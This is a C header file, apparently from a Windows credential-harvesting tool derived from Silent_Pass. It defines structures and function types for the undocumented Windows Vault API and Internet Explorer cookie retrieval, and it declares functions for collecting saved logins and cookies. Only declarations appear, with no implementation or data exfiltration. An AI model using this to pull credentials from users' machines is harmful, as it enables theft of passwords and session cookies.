// Credits to https://github.com/SilentVoid13/Silent_Pass/blob/master/src/win32/explorer.c for this (I basically did nothing.)

#ifndef EXPLORER_H
#define EXPLORER_H

#include <wchar.h>
#include <shlobj.h>
#include <urlhist.h>
#include <windows.h>
#include <wincrypt.h>

typedef HANDLE HVAULT;

enum VAULT_ELEMENT_TYPE {
	ElementType_Boolean = 0,
	ElementType_Short = 1,
	ElementType_UnsignedShort = 2,
	ElementType_Integer = 3,
	ElementType_UnsignedInteger = 4,
	ElementType_Double = 5,
	ElementType_Guid = 6,
	ElementType_String = 7,
	ElementType_ByteArray = 8,
	ElementType_TimeStamp = 9,
	ElementType_ProtectedArray = 0xA,
	ElementType_Attribute = 0xB,
	ElementType_Sid = 0xC,
	ElementType_Last = 0xD,
	ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER {
	DWORD Length;
	PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA {
	DWORD SchemaElementId;
	DWORD unk0;
	enum VAULT_ELEMENT_TYPE Type;
	DWORD unk1;
	union {
		BOOL Boolean;
		SHORT Short;
		WORD UnsignedShort;
		LONG Int;
		ULONG UnsignedInt;
		DOUBLE Double;
		GUID Guid;
		LPWSTR String;
		VAULT_BYTE_BUFFER ByteArray;
		VAULT_BYTE_BUFFER ProtectedArray;
		DWORD Attribute;
		DWORD Sid;
	} data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	PVAULT_ITEM_DATA PackageSid;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, *PVAULT_ITEM;

typedef struct _VAULT_ITEM_7 {
	GUID SchemaId;
	PWSTR FriendlyName;
	PVAULT_ITEM_DATA Resource;
	PVAULT_ITEM_DATA Identity;
	PVAULT_ITEM_DATA Authenticator;
	FILETIME LastWritten;
	DWORD Flags;
	DWORD cbProperties;
	PVAULT_ITEM_DATA Properties;
} VAULT_ITEM_7, *PVAULT_ITEM_7;

typedef DWORD(WINAPI *VaultEnumerateVaults_t)(DWORD flags, PDWORD count, GUID **guids);
typedef DWORD(WINAPI *VaultEnumerateItems_t)(HVAULT handle, DWORD flags, PDWORD count, PVOID *items);
typedef DWORD(WINAPI *VaultOpenVault_t)(GUID *id, DWORD flags, HVAULT *handle);
typedef DWORD(WINAPI *VaultCloseVault_t)(HVAULT handle);
typedef DWORD(WINAPI *VaultFree_t)(PVOID mem);
typedef DWORD(WINAPI *VaultGetItem_t) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM * pItem);

typedef BOOLEAN(WINAPI *CookiesGetCookies_t)(LPCWSTR lpszUrl, LPCWSTR lpszCookieName, LPWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, LPVOID lpReserved);

typedef struct {
	wchar_t utf_url;
	char url;
} IEUrl;

int loadlibs();
int getcookies(char*);
int getlogins();
int AppendToSlice(LPWSTR,LPWSTR,LPWSTR,LPWSTR);
int AppendToCookieSlice(LPWSTR,LPWSTR);

#endif

